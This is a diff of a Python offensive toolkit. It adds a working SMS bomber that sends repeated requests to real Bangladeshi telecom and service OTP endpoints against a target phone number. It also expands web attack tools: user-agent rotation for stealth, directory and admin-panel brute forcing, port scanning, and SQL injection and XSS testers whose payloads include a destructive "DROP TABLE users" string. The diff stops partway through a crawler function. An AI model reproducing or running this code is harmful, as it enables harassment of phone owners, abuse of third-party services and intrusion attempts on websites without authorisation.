@@ -6,6 +6,16 @@ import itertools
 import string
 from concurrent.futures import ThreadPoolExecutor
 from bs4 import BeautifulSoup
+import os
+import sys
+import time
+import socket
+import threading
+import random
+import requests
+import hashlib  # Add this import
+from concurrent.futures import ThreadPoolExecutor
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
 
 GREEN = "\033[1;32m"
 RED = "\033[1;31m"
@@ -346,28 +356,147 @@ def mac_gen():
 # ----------------------------- #
 def Lucifer_Bomber():
     try:
-        BOMBER_PASSWORD_HASH = "b9be22ceeaff67c04ec261290ab9edcc12600b9336922ca0960fd0d911e9725a"
+        import os
+        import time
+        import threading
+        import requests
 
-        def bomber_password_check():
-            attempts = 0
-            while attempts < 3:
-                print(f"{YELLOW}[!] Bomber is password protected{RESET}")
-                pw = input(f"{CYAN}[?] Enter Bomber Password: {RESET}")
-                if hashlib.sha256(pw.encode()).hexdigest() == BOMBER_PASSWORD_HASH:
-                    return True
-                else:
-                    attempts += 1
-                    print(f"{RED}[-] Wrong password! {3 - attempts} attempts left{RESET}")
-            return False
+        RED = "\033[1;31m"
+        GREEN = "\033[1;32m"
+        RESET = "\033[0m"
 
-        if not bomber_password_check():
+        PASSWORD = "Lucifer@143"
+
+        def banner():
+            os.system("cls" if os.name == "nt" else "clear")
+            print(f"""{RED}
+        ██╗     ██╗   ██╗ ██████╗██╗███████╗███████╗██████╗ 
+        ██║     ██║   ██║██╔════╝██║██╔════╝██╔════╝██╔══██╗
+        ██║     ██║   ██║██║     ██║█████╗  █████╗  ██████╔╝
+        ██║     ██║   ██║██║     ██║██╔══╝  ██╔══╝  ██╔══██╗
+        ███████╗╚██████╔╝╚██████╗██║██║     ███████╗██║  ██║
+        ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
+        {RESET}{GREEN}
+                 LUCIFER BD SMS BOMBER v2.0
+                   Developed by Foysal...
+        {RESET}""")
+
+        def password_prompt():
+            print("\033[1;31m[!] This tool is password protected.\033[0m")
+            pw = input("Enter password: ")
+            if pw != PASSWORD:
+                print("\033[1;31m[-] Incorrect Password. Exiting...\033[0m")
+                return False
+            print("\033[1;32m[+] Access Granted!\033[0m")
+            time.sleep(1)
+            return True
+
+        def bomber_menu():
+            print("\n\033[1;36m[1] Start SMS Bombing\n[2] Exit\033[0m")
+            choice = input("Select an option: ")
+            return choice
+
+        def get_target():
+            number = input("Enter target number (01XXXXXXXXX): ")
+            if number.startswith("01") and len(number) == 11:
+                return number, "880" + number[1:]
+            else:
+                print("Invalid number format.")
+                return None, None
+
+        counter = 0
+        lock = threading.Lock()
+
+        def update_counter():
+            global counter
+            with lock:
+                counter += 1
+                print(f"\033[1;32m[+] SMS Sent: {counter}\033[0m")
+
+        def fast_apis(phone, full):
+            try:
+                requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0",
+                             timeout=5)
+                update_counter()
+            except:
+                pass
+
+            try:
+                requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", timeout=5)
+                update_counter()
+            except:
+                pass
+
+        def normal_apis(phone, full):
+            apis = [
+                ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
+                ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php",
+                 {"phone": phone}),
+                ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
+                ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
+                ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
+                ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
+                ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
+                ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
+            ]
+
+            for url, data in apis:
+                try:
+                    requests.post(url, json=data, timeout=5)
+                    update_counter()
+                except:
+                    pass
+
+        def start_bombing():
+            phone, full = get_target()
+            if phone is None:
+                return
+
+            print(f"\n{GREEN}[+] Starting SMS Bombing on {phone}{RESET}")
+            print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")
+
+            try:
+                while True:
+                    threads = []
+
+                    for _ in range(3):
+                        t = threading.Thread(target=fast_apis, args=(phone, full))
+                        t.daemon = True
+                        t.start()
+                        threads.append(t)
+
+                    t = threading.Thread(target=normal_apis, args=(phone, full))
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
+
+                    for t in threads:
+                        t.join(timeout=10)
+                    time.sleep(1)
+
+            except KeyboardInterrupt:
+                print(f"\n{RED}[!] SMS Bombing stopped by user.{RESET}")
+                print(f"{GREEN}[+] Total SMS sent: {counter}{RESET}")
+
+        # Main bomber execution
+        banner()
+        if not password_prompt():
             return
 
-        # Bomber code here (shortened for brevity)
-        print(f"{GREEN}[+] Bomber access granted{RESET}")
+        while True:
+            choice = bomber_menu()
+            if choice == "1":
+                start_bombing()
+                break
+            elif choice == "2":
+                print(f"{RED}[+] Returning to main menu...{RESET}")
+                break
+            else:
+                print(f"{RED}[-] Invalid option!{RESET}")
 
     except Exception as e:
         print(f"{RED}\nBomber Failed: {str(e)}{RESET}")
+        print(f"{YELLOW}Returning to main menu...{RESET}")
 
 
 # ----------------------------- #
@@ -635,12 +764,19 @@ def web_hacking_tools():
         def __init__(self):
             self.session = requests.Session()
             self.results = []
+            # Add more user agents for better stealth
+            self.user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
+            ]
 
         def banner(self):
             print(f"""
 {CYAN}╔══════════════════════════════════════╗
 ║           WEB HACKING TOOLS         ║
-║           [Termux Edition]          ║
+║           [Lucifer Edition]         ║
 ╚══════════════════════════════════════╝{RESET}
             """)
 
@@ -652,7 +788,20 @@ def web_hacking_tools():
             print(f"{CYAN}[5]{RESET} Port Scanner")
             print(f"{CYAN}[6]{RESET} Website Information Gatherer")
             print(f"{CYAN}[7]{RESET} Admin Panel Finder")
+            print(f"{CYAN}[8]{RESET} Crawler & Link Extractor")
+            print(f"{CYAN}[9]{RESET} Header Security Analyzer")
             print(f"{CYAN}[0]{RESET} Back to Main Menu")
+
+        def get_headers(self):
+            """Get random headers for requests"""
+            return {
+                'User-Agent': random.choice(self.user_agents),
+                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                'Accept-Language': 'en-US,en;q=0.5',
+                'Accept-Encoding': 'gzip, deflate',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1',
+            }
 
         def directory_bruteforce(self):
             print(f"\n{CYAN}[=== DIRECTORY BRUTEFORCER ===]{RESET}")
@@ -663,6 +812,9 @@ def web_hacking_tools():
 
             if not url.startswith(('http://', 'https://')):
                 url = 'http://' + url
+
+            # Remove trailing slash
+            url = url.rstrip('/')
 
             print(f"\n{GREEN}[*] Target: {url}{RESET}")
             print(f"{GREEN}[*] Wordlist: {wordlist_path}{RESET}")
@@ -675,6 +827,9 @@ def web_hacking_tools():
             except FileNotFoundError:
                 print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                 return
+            except Exception as e:
+                print(f"{RED}[-] Error reading wordlist: {e}{RESET}")
+                return
 
             found_dirs = []
             lock = threading.Lock()
@@ -682,33 +837,57 @@ def web_hacking_tools():
             def check_directory(directory):
                 try:
                     test_url = f"{url}/{directory}"
-                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+                    headers = self.get_headers()
 
-                    response = self.session.get(test_url, headers=headers, timeout=10, allow_redirects=False)
+                    response = self.session.get(test_url, headers=headers, timeout=8, allow_redirects=False)
 
+                    # Enhanced status code checking
                     if response.status_code == 200:
                         with lock:
-                            found_dirs.append(test_url)
-                        print(f"{GREEN}[+] FOUND: {test_url} (200){RESET}")
-                    elif response.status_code in [301, 302, 307]:
-                        print(f"{YELLOW}[!] REDIRECT: {test_url} -> {response.status_code}{RESET}")
+                            found_dirs.append((test_url, response.status_code, len(response.content)))
+                        print(
+                            f"{GREEN}[+] FOUND [{response.status_code}]: {test_url} ({len(response.content)} bytes){RESET}")
+                    elif response.status_code in [301, 302, 307, 308]:
+                        location = response.headers.get('Location', 'Unknown')
+                        print(f"{YELLOW}[!] REDIRECT [{response.status_code}]: {test_url} -> {location}{RESET}")
                     elif response.status_code == 403:
-                        print(f"{RED}[-] FORBIDDEN: {test_url} (403){RESET}")
+                        print(f"{RED}[-] FORBIDDEN [{response.status_code}]: {test_url}{RESET}")
+                    elif response.status_code == 401:
+                        print(f"{YELLOW}[!] UNAUTHORIZED [{response.status_code}]: {test_url}{RESET}")
+                    elif response.status_code in [500, 502, 503]:
+                        print(f"{RED}[-] SERVER ERROR [{response.status_code}]: {test_url}{RESET}")
 
-                except Exception:
-                    pass
+                except requests.exceptions.Timeout:
+                    print(f"{RED}[-] TIMEOUT: {directory}{RESET}")
+                except Exception as e:
+                    pass  # Silent fail for other exceptions
 
             start_time = time.time()
 
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                executor.map(check_directory, directories)
+            try:
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    # Process in chunks to avoid memory issues
+                    chunk_size = 100
+                    for i in range(0, len(directories), chunk_size):
+                        chunk = directories[i:i + chunk_size]
+                        executor.map(check_directory, chunk)
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
 
-            print(f"\n{YELLOW}[*] Scan completed in {time.time() - start_time:.2f}s{RESET}")
+            total_time = time.time() - start_time
+            print(f"\n{YELLOW}[*] Scan completed in {total_time:.2f}s{RESET}")
             print(f"{GREEN}[*] Found {len(found_dirs)} accessible directories{RESET}")
+
+            if found_dirs:
+                print(f"\n{GREEN}[+] Found directories:{RESET}")
+                for url, status, size in found_dirs[:20]:  # Show first 20
+                    print(f"  - {url} ({status}, {size} bytes)")
+                if len(found_dirs) > 20:
+                    print(f"  ... and {len(found_dirs) - 20} more")
 
         def subdomain_scanner(self):
             print(f"\n{CYAN}[=== SUBDOMAIN SCANNER ===]{RESET}")
-            domain = input("[?] Enter target domain: ").strip()
+            domain = input("[?] Enter target domain (without http://): ").strip()
             wordlist_path = input("[?] Enter subdomain wordlist path: ").strip()
             threads = input("[?] Enter threads (default 10): ").strip()
             threads = int(threads) if threads.isdigit() else 10
@@ -718,33 +897,69 @@ def web_hacking_tools():
             print(f"{YELLOW}[*] Scanning subdomains...{RESET}\n")
 
             try:
-                with open(wordlist_path, 'r') as f:
+                with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                     subdomains = [line.strip() for line in f if line.strip()]
             except FileNotFoundError:
                 print(f"{RED}[-] Wordlist not found: {wordlist_path}{RESET}")
                 return
+            except Exception as e:
+                print(f"{RED}[-] Error reading wordlist: {e}{RESET}")
+                return
 
             found_subs = []
+            lock = threading.Lock()
 
             def check_subdomain(subdomain):
                 try:
-                    url = f"http://{subdomain}.{domain}"
-                    response = self.session.get(url, timeout=5)
-                    if response.status_code == 200:
-                        found_subs.append(url)
-                        print(f"{GREEN}[+] FOUND: {url}{RESET}")
+                    full_domain = f"{subdomain}.{domain}"
+
+                    # Try HTTP first
+                    url = f"http://{full_domain}"
+                    response = self.session.get(url, headers=self.get_headers(), timeout=5, allow_redirects=False)
+
+                    if response.status_code in [200, 301, 302, 403, 401]:
+                        with lock:
+                            found_subs.append((full_domain, response.status_code))
+                        print(f"{GREEN}[+] FOUND [{response.status_code}]: {full_domain}{RESET}")
+
+                    # Also try HTTPS
+                    try:
+                        url_https = f"https://{full_domain}"
+                        response_https = self.session.get(url_https, headers=self.get_headers(), timeout=3,
+                                                          allow_redirects=False)
+                        if response_https.status_code in [200, 301, 302, 403,
+                                                          401] and response.status_code != response_https.status_code:
+                            print(f"{GREEN}[+] FOUND [{response_https.status_code}]: {full_domain} (HTTPS){RESET}")
+                    except:
+                        pass
+
                 except:
                     pass
 
-            with ThreadPoolExecutor(max_workers=threads) as executor:
-                executor.map(check_subdomain, subdomains)
+            start_time = time.time()
 
-            print(f"\n{GREEN}[*] Found {len(found_subs)} subdomains{RESET}")
+            try:
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    executor.map(check_subdomain, subdomains)
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
+
+            total_time = time.time() - start_time
+            print(f"\n{GREEN}[*] Found {len(found_subs)} subdomains in {total_time:.2f}s{RESET}")
+
+            if found_subs:
+                print(f"\n{GREEN}[+] Found subdomains:{RESET}")
+                for domain, status in found_subs:
+                    print(f"  - {domain} ({status})")
 
         def sql_injection_test(self):
             print(f"\n{CYAN}[=== SQL INJECTION TESTER ===]{RESET}")
-            url = input("[?] Enter target URL: ").strip()
+            url = input("[?] Enter target URL (with parameters): ").strip()
 
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+
+            # Enhanced SQL injection payloads
             payloads = [
                 "'",
                 "';",
@@ -752,152 +967,289 @@ def web_hacking_tools():
                 "' OR 1=1--",
                 "' UNION SELECT 1,2,3--",
                 "' AND 1=1--",
-                "' AND 1=2--"
+                "' AND 1=2--",
+                "'; DROP TABLE users--",
+                "' OR SLEEP(5)--",
+                "' OR BENCHMARK(1000000,MD5('test'))--"
             ]
 
             print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
             print(f"{YELLOW}[*] Sending SQL injection payloads...{RESET}\n")
 
             vulnerable = False
+            found_payloads = []
 
             for payload in payloads:
                 try:
-                    if '=' in url:
-                        test_url = url + payload
-                    else:
-                        test_url = url + "?id=" + urllib.parse.quote(payload)
+                    # Test in parameters
+                    parsed_url = urllib.parse.urlparse(url)
+                    query_params = urllib.parse.parse_qs(parsed_url.query)
 
-                    response = self.session.get(test_url, timeout=10)
+                    if query_params:
+                        for param in query_params:
+                            test_params = query_params.copy()
+                            test_params[param] = payload
+                            new_query = urllib.parse.urlencode(test_params, doseq=True)
+                            test_url = urllib.parse.urlunparse((
+                                parsed_url.scheme,
+                                parsed_url.netloc,
+                                parsed_url.path,
+                                parsed_url.params,
+                                new_query,
+                                parsed_url.fragment
+                            ))
 
-                    error_indicators = [
-                        "mysql_fetch_array",
-                        "mysql_num_rows",
-                        "syntax error",
-                        "mysql error",
-                        "ORA-",
-                        "Microsoft OLE DB",
-                        "SQLServer JDBC Driver"
-                    ]
+                            response = self.session.get(test_url, headers=self.get_headers(), timeout=10)
 
-                    for error in error_indicators:
-                        if error.lower() in response.text.lower():
-                            print(f"{RED}[!] SQL Injection found with payload: {payload}{RESET}")
-                            vulnerable = True
-                            break
+                            # Enhanced error detection
+                            error_indicators = [
+                                "mysql_fetch_array", "mysql_num_rows", "mysql error",
+                                "ORA-", "Microsoft OLE DB", "SQLServer JDBC Driver",
+                                "PostgreSQL", "SQLite", "SQL syntax", "syntax error",
+                                "unclosed quotation mark", "undefined function"
+                            ]
+
+                            for error in error_indicators:
+                                if error.lower() in response.text.lower():
+                                    print(
+                                        f"{RED}[!] SQL Injection found in parameter '{param}' with payload: {payload}{RESET}")
+                                    vulnerable = True
+                                    found_payloads.append((param, payload))
+                                    break
 
                 except Exception as e:
-                    print(f"{RED}[-] Error testing payload: {payload}{RESET}")
+                    print(f"{RED}[-] Error testing payload: {payload} - {e}{RESET}")
 
             if not vulnerable:
                 print(f"{GREEN}[-] No SQL injection vulnerabilities found{RESET}")
             else:
-                print(f"\n{RED}[!] Website might be vulnerable to SQL Injection!{RESET}")
+                print(f"\n{RED}[!] Website is vulnerable to SQL Injection!{RESET}")
+                print(f"{YELLOW}[!] Vulnerable parameters:{RESET}")
+                for param, payload in found_payloads:
+                    print(f"  - {param}: {payload}")
 
         def xss_scanner(self):
-            print(f"\n{CYAN}[=== XSS SCANNER ===]{RESET}")
-            url = input("[?] Enter target URL: ").strip()
+            print(f"\n{CYAN}[=== XSS VULNERABILITY SCANNER ===]{RESET}")
+            url = input("[?] Enter target URL (with parameters): ").strip()
 
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+
+            # Enhanced XSS payloads
             xss_payloads = [
                 "<script>alert('XSS')</script>",
                 "<img src=x onerror=alert('XSS')>",
                 "<svg onload=alert('XSS')>",
                 "'><script>alert('XSS')</script>",
-                "\"><script>alert('XSS')</script>"
+                "\"><script>alert('XSS')</script>",
+                "javascript:alert('XSS')",
+                "<body onload=alert('XSS')>",
+                "<iframe src=javascript:alert('XSS')>"
             ]
 
             print(f"\n{GREEN}[*] Testing URL: {url}{RESET}")
             print(f"{YELLOW}[*] Sending XSS payloads...{RESET}\n")
 
             vulnerable = False
+            found_payloads = []
+
+            parsed_url = urllib.parse.urlparse(url)
+            query_params = urllib.parse.parse_qs(parsed_url.query)
+
+            if not query_params:
+                print(f"{RED}[-] No parameters found in URL{RESET}")
+                return
 
             for payload in xss_payloads:
                 try:
-                    if '=' in url:
-                        test_url = url + urllib.parse.quote(payload)
-                    else:
-                        test_url = url + "?q=" + urllib.parse.quote(payload)
+                    for param in query_params:
+                        test_params = query_params.copy()
+                        test_params[param] = payload
+                        new_query = urllib.parse.urlencode(test_params, doseq=True)
+                        test_url = urllib.parse.urlunparse((
+                            parsed_url.scheme,
+                            parsed_url.netloc,
+                            parsed_url.path,
+                            parsed_url.params,
+                            new_query,
+                            parsed_url.fragment
+                        ))
 
-                    response = self.session.get(test_url, timeout=10)
+                        response = self.session.get(test_url, headers=self.get_headers(), timeout=10)
 
-                    if payload.replace('<', '&lt;') not in response.text and 'alert' in payload:
-                        print(f"{RED}[!] Possible XSS with payload: {payload[:20]}...{RESET}")
-                        vulnerable = True
+                        # Check if payload is reflected without proper encoding
+                        if payload in response.text:
+                            # Check if it's properly encoded
+                            encoded_payload = payload.replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')
+                            if encoded_payload not in response.text:
+                                print(f"{RED}[!] XSS found in parameter '{param}' with payload: {payload}{RESET}")
+                                vulnerable = True
+                                found_payloads.append((param, payload))
 
                 except Exception as e:
-                    print(f"{RED}[-] Error testing XSS payload{RESET}")
+                    print(f"{RED}[-] Error testing XSS payload: {e}{RESET}")
 
             if not vulnerable:
                 print(f"{GREEN}[-] No XSS vulnerabilities found{RESET}")
             else:
-                print(f"\n{RED}[!] Website might be vulnerable to XSS!{RESET}")
+                print(f"\n{RED}[!] Website is vulnerable to XSS!{RESET}")
+                print(f"{YELLOW}[!] Vulnerable parameters:{RESET}")
+                for param, payload in found_payloads:
+                    print(f"  - {param}: {payload}")
 
         def port_scanner(self):
             print(f"\n{CYAN}[=== PORT SCANNER ===]{RESET}")
             target = input("[?] Enter target IP/hostname: ").strip()
-            start_port = int(input("[?] Start port: "))
-            end_port = int(input("[?] End port: "))
-            threads = input("[?] Enter threads (default 20): ").strip()
-            threads = int(threads) if threads.isdigit() else 20
+
+            try:
+                start_port = int(input("[?] Start port (default 1): ") or "1")
+                end_port = int(input("[?] End port (default 1000): ") or "1000")
+            except ValueError:
+                print(f"{RED}[-] Invalid port number{RESET}")
+                return
+
+            threads = input("[?] Enter threads (default 50): ").strip()
+            threads = int(threads) if threads.isdigit() else 50
+
+            # Common ports to check first
+            common_ports = [21, 22, 23, 25, 53, 80, 110, 443, 993, 995, 8080, 8443]
 
             print(f"\n{GREEN}[*] Scanning {target} from port {start_port} to {end_port}{RESET}")
             print(f"{YELLOW}[*] Scanning started...{RESET}\n")
 
             open_ports = []
+            lock = threading.Lock()
 
             def scan_port(port):
                 try:
                     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
+                    sock.settimeout(2)
                     result = sock.connect_ex((target, port))
                     sock.close()
 
                     if result == 0:
-                        open_ports.append(port)
-                        print(f"{GREEN}[+] Port {port} is open{RESET}")
+                        with lock:
+                            open_ports.append(port)
+                        # Try to get service name
+                        try:
+                            service = socket.getservbyport(port, 'tcp')
+                        except:
+                            service = "unknown"
+                        print(f"{GREEN}[+] Port {port}/tcp open - {service}{RESET}")
                 except:
                     pass
 
             start_time = time.time()
 
+            # Scan common ports first
+            print(f"{YELLOW}[*] Scanning common ports...{RESET}")
             with ThreadPoolExecutor(max_workers=threads) as executor:
-                executor.map(scan_port, range(start_port, end_port + 1))
+                executor.map(scan_port, common_ports)
 
-            print(f"\n{YELLOW}[*] Scan completed in {time.time() - start_time:.2f}s{RESET}")
+            # Scan remaining ports
+            remaining_ports = [p for p in range(start_port, end_port + 1) if p not in common_ports]
+            if remaining_ports:
+                print(f"{YELLOW}[*] Scanning remaining ports...{RESET}")
+                with ThreadPoolExecutor(max_workers=threads) as executor:
+                    # Process in chunks
+                    chunk_size = 100
+                    for i in range(0, len(remaining_ports), chunk_size):
+                        chunk = remaining_ports[i:i + chunk_size]
+                        executor.map(scan_port, chunk)
+
+            total_time = time.time() - start_time
+            print(f"\n{YELLOW}[*] Scan completed in {total_time:.2f}s{RESET}")
             print(f"{GREEN}[*] Found {len(open_ports)} open ports{RESET}")
 
             if open_ports:
                 print(f"{GREEN}[+] Open ports: {sorted(open_ports)}{RESET}")
 
         def website_info(self):
-            print(f"\n{CYAN}[=== WEBSITE INFORMATION ===]{RESET}")
+            print(f"\n{CYAN}[=== WEBSITE INFORMATION GATHERER ===]{RESET}")
             url = input("[?] Enter target URL: ").strip()
 
             if not url.startswith(('http://', 'https://')):
                 url = 'http://' + url
 
             try:
-                response = self.session.get(url, timeout=10)
+                response = self.session.get(url, headers=self.get_headers(), timeout=10)
 
-                print(f"\n{GREEN}[+] URL: {url}{RESET}")
+                print(f"\n{GREEN}{'=' * 50}{RESET}")
+                print(f"{GREEN}[+] BASIC INFORMATION{RESET}")
+                print(f"{GREEN}{'=' * 50}{RESET}")
+                print(f"{GREEN}[+] URL: {url}{RESET}")
                 print(f"{GREEN}[+] Status Code: {response.status_code}{RESET}")
                 print(f"{GREEN}[+] Server: {response.headers.get('Server', 'Unknown')}{RESET}")
                 print(f"{GREEN}[+] Content Type: {response.headers.get('Content-Type', 'Unknown')}{RESET}")
                 print(f"{GREEN}[+] Content Length: {len(response.content)} bytes{RESET}")
+                print(f"{GREEN}[+] Response Time: {response.elapsed.total_seconds():.2f}s{RESET}")
 
-                if 'PHP' in response.headers.get('X-Powered-By', ''):
-                    print(f"{GREEN}[+] Technology: PHP{RESET}")
-                if 'WordPress' in response.text:
-                    print(f"{GREEN}[+] CMS: WordPress{RESET}")
-                if 'Joomla' in response.text:
-                    print(f"{GREEN}[+] CMS: Joomla{RESET}")
+                # Security Headers Check
+                print(f"\n{GREEN}[+] SECURITY HEADERS{RESET}")
+                print(f"{GREEN}{'=' * 50}{RESET}")
+                security_headers = {
+                    'X-Frame-Options': 'Missing - Clickjacking vulnerability',
+                    'X-Content-Type-Options': 'Missing - MIME sniffing vulnerability',
+                    'X-XSS-Protection': 'Missing - XSS protection not enabled',
+                    'Strict-Transport-Security': 'Missing - HTTPS not enforced',
+                    'Content-Security-Policy': 'Missing - Content security policy not set'
+                }
 
-                soup = BeautifulSoup(response.text, 'html.parser')
-                links = soup.find_all('a', href=True)
+                for header, message in security_headers.items():
+                    if header in response.headers:
+                        print(f"{GREEN}[✓] {header}: {response.headers[header]}{RESET}")
+                    else:
+                        print(f"{RED}[✗] {header}: {message}{RESET}")
 
-                print(f"\n{GREEN}[+] Found {len(links)} links{RESET}")
-                print(f"\n{YELLOW}First 10 links:{RESET}")
-                for link in links[:10]:
-                    print(f"  - {link['href']}")
+                # Technology Detection
+                print(f"\n{GREEN}[+] TECHNOLOGY DETECTION{RESET}")
+                print(f"{GREEN}{'=' * 50}{RESET}")
+
+                tech_indicators = {
+                    'PHP': ['PHP', 'X-Powered-By: PHP'],
+                    'WordPress': ['wp-content', 'wp-includes', 'WordPress'],
+                    'Joomla': ['joomla', 'Joomla'],
+                    'Drupal': ['Drupal', 'drupal'],
+                    'Apache': ['Apache', 'apache'],
+                    'Nginx': ['nginx', 'NGINX'],
+                    'IIS': ['Microsoft-IIS', 'IIS'],
+                    'React': ['react', 'React'],
+                    'jQuery': ['jquery', 'jQuery']
+                }
+
+                detected_tech = []
+                for tech, indicators in tech_indicators.items():
+                    for indicator in indicators:
+                        if indicator in response.headers.get('Server', '') or indicator in response.headers.get(
+                                'X-Powered-By', '') or indicator.lower() in response.text.lower():
+                            if tech not in detected_tech:
+                                detected_tech.append(tech)
+                                print(f"{GREEN}[+] Technology: {tech}{RESET}")
+                                break
+
+                # Extract Links
+                try:
+                    soup = BeautifulSoup(response.text, 'html.parser')
+                    links = soup.find_all('a', href=True)
+                    forms = soup.find_all('form')
+
+                    print(f"\n{GREEN}[+] LINKS & FORMS{RESET}")
+                    print(f"{GREEN}{'=' * 50}{RESET}")
+                    print(f"{GREEN}[+] Found {len(links)} links{RESET}")
+                    print(f"{GREEN}[+] Found {len(forms)} forms{RESET}")
+
+                    print(f"\n{YELLOW}[*] First 10 links:{RESET}")
+                    for link in links[:10]:
+                        href = link.get('href', '')
+                        if href.startswith(('http://', 'https://', '//')):
+                            print(f"  - {href}")
+                        elif href.startswith('/'):
+                            print(f"  - {url.rstrip('/')}{href}")
+                        else:
+                            print(f"  - {url.rstrip('/')}/{href}")
+
+                except Exception as e:
+                    print(f"{RED}[-] Error parsing HTML: {e}{RESET}")
 
             except Exception as e:
                 print(f"{RED}[-] Error: {e}{RESET}")
@@ -909,35 +1261,184 @@ def web_hacking_tools():
             if not url.startswith(('http://', 'https://')):
                 url = 'http://' + url
 
+            url = url.rstrip('/')
+
+            # Enhanced admin panel paths
             admin_paths = [
-                "admin", "administrator", "wp-admin", "admin/login",
-                "admin_area", "panel", "manage", "login", "dashboard",
-                "backend", "cp", "controlpanel", "webadmin", "admincp"
+                "admin", "administrator", "wp-admin", "wp-login.php", "admin/login",
+                "admin_area", "panel", "manage", "login", "dashboard", "user/login",
+                "backend", "cp", "controlpanel", "webadmin", "admincp", "moderator",
+                "staff", "master", "root", "system", "config", "configuration",
+                "phpmyadmin", "mysql", "dbadmin", "sql", "database", "webdav"
             ]
 
             print(f"\n{GREEN}[*] Searching admin panels on: {url}{RESET}")
             print(f"{YELLOW}[*] Scanning...{RESET}\n")
 
             found_panels = []
+            lock = threading.Lock()
 
-            for path in admin_paths:
+            def check_admin_path(path):
                 try:
                     test_url = f"{url}/{path}"
-                    response = self.session.get(test_url, timeout=5)
+                    response = self.session.get(test_url, headers=self.get_headers(), timeout=5, allow_redirects=False)
 
                     if response.status_code == 200:
-                        found_panels.append(test_url)
-                        print(f"{GREEN}[+] Admin panel found: {test_url}{RESET}")
-                    elif response.status_code in [301, 302]:
-                        print(f"{YELLOW}[!] Redirect: {test_url} -> {response.status_code}{RESET}")
+                        title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
+                        title = title_match.group(1) if title_match else "No title"
 
-                except Exception:
+                        with lock:
+                            found_panels.append((test_url, response.status_code, title))
+                        print(f"{GREEN}[+] ADMIN PANEL: {test_url} (Title: {title[:50]}){RESET}")
+                    elif response.status_code in [301, 302]:
+                        location = response.headers.get('Location', 'Unknown')
+                        print(f"{YELLOW}[!] REDIRECT: {test_url} -> {location}{RESET}")
+                    elif response.status_code == 403:
+                        print(f"{RED}[-] FORBIDDEN: {test_url}{RESET}")
+                    elif response.status_code == 401:
+                        print(f"{YELLOW}[!] AUTH REQUIRED: {test_url}{RESET}")
+
+                except Exception as e:
                     pass
+
+            start_time = time.time()
+
+            with ThreadPoolExecutor(max_workers=10) as executor:
+                executor.map(check_admin_path, admin_paths)
+
+            total_time = time.time() - start_time
+            print(f"\n{YELLOW}[*] Scan completed in {total_time:.2f}s{RESET}")
 
             if not found_panels:
                 print(f"{RED}[-] No admin panels found{RESET}")
             else:
                 print(f"\n{GREEN}[+] Found {len(found_panels)} potential admin panels{RESET}")
+
+        def crawler(self):
+            print(f"\n{CYAN}[=== WEBSITE CRAWLER ===]{RESET}")
+            url = input("[?] Enter target URL: ").strip()
+
+            if not url.startswith(('http://', 'https://')):
+                url = 'http://' + url
+
+            print(f"\n{GREEN}[*] Crawling: {url}{RESET}")
+            print(f"{YELLOW}[*] This may take a while...{RESET}\n")
+
+            visited = set()
+            to_visit = [url]
+            external_links = []
+            forms = []
+
+            def crawl_page(page_url):
+                if page_url in visited:
+                    return
+                visited.add(page_url)
+
+                try:
+                    response = self.session.get(page_url, headers=self.get_headers(), timeout=8)
+                    soup = BeautifulSoup(response.text, 'html.parser')
+
+                    # Extract all links
+                    for link in soup.find_all('a', href=True):
+                        href = link.get('href')
+                        full_url = urllib.parse.urljoin(page_url, href)
+
+                        if url in full_url and full_url not in visited and full_url not in to_visit:
+                            to_visit.append(full_url)
+                            print(f"{GREEN}[+] Internal: {full_url}{RESET}")
+                        elif url not in full_url and full_url not in external_links:
+                            external_links.append(full_url)
+                            print(f"{YELLOW}[!] External: {full_url}{RESET}")
+
+                    # Extract forms
+                    for form in soup.find_all('form'):
+                        form_action = form.get('action', '')
+                        form_method = form.get('method', 'GET').upper()
+                        full_form_url = urllib.parse.urljoin(page_url, form_action)
+                        forms.append((full_form_url, form_method))
+                        print(f"{CYAN}[+] Form: {full_form_url} [{form_method}]{RESET}")
+
